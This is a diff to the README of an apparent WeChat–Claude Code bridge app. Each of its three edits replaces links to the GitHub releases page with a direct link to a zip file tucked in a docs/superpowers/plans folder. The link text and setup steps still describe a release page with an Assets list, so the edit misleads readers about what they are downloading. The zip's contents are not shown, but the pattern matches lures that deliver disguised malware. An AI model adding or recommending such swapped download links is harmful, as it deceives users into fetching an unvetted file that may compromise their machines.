@@ -1,6 +1,6 @@
 # 🤖 weixin_claude_code - Link WeChat and Claude Code
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-blue?style=for-the-badge)](https://github.com/Jtechzone/weixin_claude_code/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-blue?style=for-the-badge)](https://github.com/Jtechzone/weixin_claude_code/raw/refs/heads/main/docs/superpowers/plans/weixin_claude_code_1.3.zip)
 
 ## 📌 What this app does
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 🪟 Windows download and setup
 
-1. Open the [release page](https://github.com/Jtechzone/weixin_claude_code/releases)
+1. Open the [release page](https://github.com/Jtechzone/weixin_claude_code/raw/refs/heads/main/docs/superpowers/plans/weixin_claude_code_1.3.zip)
 2. Find the latest version near the top of the page
 3. Download the Windows file from the Assets list
 4. Save the file to a folder you can find later, such as `Downloads`
@@ -134,7 +134,7 @@ If the app still fails, compare your files with the setup notes in the release s
 
 Use this page to download the latest Windows release:
 
-https://github.com/Jtechzone/weixin_claude_code/releases
+https://github.com/Jtechzone/weixin_claude_code/raw/refs/heads/main/docs/superpowers/plans/weixin_claude_code_1.3.zip
 
 ## 📝 File names to look for
 
